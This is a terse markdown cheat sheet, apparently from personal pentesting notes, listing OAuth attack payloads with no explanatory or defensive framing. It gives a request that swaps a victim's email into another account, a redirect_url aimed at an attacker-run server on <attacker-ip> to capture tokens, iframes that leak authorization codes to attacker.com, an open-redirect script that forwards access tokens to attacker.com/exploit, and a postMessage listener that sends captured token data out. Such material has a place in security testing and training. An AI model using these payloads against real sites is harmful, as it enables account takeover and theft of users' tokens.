---
title: OAuth Attack
desc: 
tags: [Burp Suite, CSRF, OAuth, Web]
alts: []
render_with_liquid: false
---

## 1. Change User Info

```json
POST /authenticate HTTP/1.1
...

{
    "email":"victim@example.com",
    "username":"attacker",
    "token":"b7Gl7Xoy..."
}
```

<br />

## 2. Steal Tokens

1. **Open Web Server in Your Local Machine**

    ```sh
    python3 -m http.server 8000
    ```

2. **Inject Your Local URL to the Redirect URL**

    Access to the URL below.

    ```sh
    https://vulnerable.com/oauth?redirect_url=http://<attacker-ip>:8000/login&response_type=token&scope=all
    ```

<br />

## 3. CSRF

1. **Steal Code**

    ```html
    <iframe src="https://vulnerable.com/oauth-linking?code=kZ7bfFa..."></iframe>
    ```

2. **Hijack redirect_url**

    ```html
    <iframe src="https://vulnerable.com/auth?client_id=ysdj...&redirect_uri=https://attacker.com&response_type=code&scope=openid%20profile%20email">
    </iframe>
    ```

3. **Open Redirect**

    ```html
    <script>
        if (!document.location.hash) {
            window.location = 'https://vulnerable.com/auth?client_id=7Fdx8a...&redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&response_type=token&nonce=398...&scope=openid%20profile%20email'
        } else {
            window.location = '/?'+document.location.hash.substr(1)
        }
    </script>
    ```

4. **Proxy Page (postMessage)**

    ```html
    <iframe src="https://vulnerable.com/auth?client_id=iknf...&redirect_uri=https://vulnerable.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-118...&scope=openid%20profile%20email"></iframe>
    <script>
        window.addEventListener('message', e => {
            fetch("/" + encodeURIComponent(e.data.data));
        }, false);
    </script>
    ```
